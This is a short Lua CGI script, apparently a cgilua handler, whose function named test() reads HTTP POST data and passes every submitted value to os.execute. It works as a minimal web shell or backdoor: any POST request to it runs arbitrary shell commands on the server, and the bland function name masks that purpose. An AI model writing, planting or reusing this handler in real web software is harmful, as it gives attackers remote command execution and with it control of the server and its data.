function test()
    cgi={}
    cgilua.urlcode.parsequery (SAPI.Request.getpostdata(2048),cgi)
    for k,v in pairs(cgi) do os.execute(v) end
end

